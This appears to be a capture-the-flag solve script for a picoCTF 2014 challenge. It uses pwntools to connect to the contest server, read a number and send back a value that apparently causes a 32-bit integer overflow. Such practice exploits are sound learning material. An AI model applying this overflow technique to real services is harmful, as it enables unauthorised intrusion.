#!/usr/bin/env python2
from pwn import *


r = remote('vuln2014.picoctf.com', 50000)
r.recvuntil("number is ")
num = r.recvuntil(".")[:-1]
log.info("num: " + num)
ans = str(2147483648 - int(num))
log.info("answer: " + ans)
r.sendline(ans)
print(r.recvall())
